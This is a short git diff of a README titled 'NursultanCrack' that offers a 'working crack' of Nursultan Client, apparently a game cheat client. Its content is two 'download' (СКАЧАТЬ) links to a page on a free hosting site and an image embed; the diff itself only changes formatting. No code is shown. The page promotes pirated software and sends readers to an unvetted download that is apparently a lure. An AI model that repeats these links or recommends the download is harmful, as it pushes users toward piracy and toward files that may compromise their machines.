@@ -1,10 +1,7 @@
 # NursultanCrack
 ## Nursultan Crack  
 [**СКАЧАТЬ**](https://sigmafile.42web.io/index.html)
-
-
-
-## ![https://tikolu.net/i/jyabm]
+![](https://tikolu.net/i/jyabm)
 [**СКАЧАТЬ**](https://sigmafile.42web.io/index.html)
 
 ## **Рабочий кряк Nursultan Client.**  
